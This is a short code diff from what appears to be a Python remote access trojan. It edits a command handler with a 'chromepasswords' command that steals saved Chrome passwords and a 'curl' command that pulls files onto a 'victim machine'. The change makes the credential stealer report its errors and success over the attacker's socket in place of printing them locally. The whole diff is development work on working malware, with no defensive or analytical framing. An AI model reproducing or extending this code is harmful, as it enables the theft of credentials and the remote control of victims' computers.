@@ -242,9 +242,7 @@ def connect():
                 print(ex)
 
         elif dec == 'chromepasswords': #Steals any saved chrome passwords
-            message = "Executed Successfully"
             chromestealer(sct)
-            sct.send(message.encode())
 
         elif dec == 'curl': #Allows files to be curled onto victim machine
             sct.send('Enter link'.encode())
@@ -769,16 +767,16 @@ def chromestealer(sct):
     except Exception as e:
         e = str(e)
         if (e == 'database is locked'):
-            print('[!] Make sure Google Chrome is not running in the background')
+            sct.send('[!] Make sure Google Chrome is not running in the background'.encode())
             return()
         elif (e == 'no such table: logins'):
-            print('[!] Something wrong with the database name')
+            sct.send('[!] Something wrong with the database name'.encode())
             return()
         elif (e == 'unable to open database file'):
-            print('[!] Something wrong with the database path')
+            sct.send('[!] Something wrong with the database path'.encode())
             return()
         else:
-            print(e)
+            sct.send("Executed Successfully".encode())
             return()
 
 
